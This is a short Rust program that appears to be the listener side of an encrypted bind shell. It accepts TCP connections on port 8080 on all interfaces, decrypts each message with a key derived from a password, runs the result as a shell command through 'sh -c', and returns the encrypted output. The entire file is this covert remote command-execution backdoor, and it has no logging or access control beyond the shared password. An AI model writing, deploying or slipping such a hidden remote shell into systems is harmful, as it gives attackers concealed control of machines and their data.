use std::io::{Read, Write};
use std::net::TcpListener;
use std::process::Command;

mod common;

fn main() {
    let password = std::env::args()
        .nth(1)
        .expect("Password argument not found");
    let key = common::derive_key(&password);
    let mut nonce = common::derive_nonce(&password);

    let listener = TcpListener::bind("0.0.0.0:8080").expect("Failed to bind listener");

    for stream in listener.incoming() {
        let mut stream = stream.expect("Failed to accept incoming connection");

        loop {
            let mut buffer = [0u8; 4096];
            let n = stream
                .read(&mut buffer)
                .expect("Failed to read data from the stream");
            if n == 0 {
                break;
            }

            let decrypted_command =
                common::decrypt_data(&buffer[..n], &key, &nonce).expect("Failed to decrypt data");
            let command = String::from_utf8(decrypted_command).expect("Failed to decode command");
            let output = Command::new("sh")
                .arg("-c")
                .arg(command)
                .output()
                .expect("Failed to execute command");
            let encrypted_output = common::encrypt_data(&output.stdout, &key, &nonce);

            stream
                .write_all(&encrypted_output)
                .expect("Failed to write data to the stream");

            common::increment_nonce(&mut nonce);
        }
    }
}
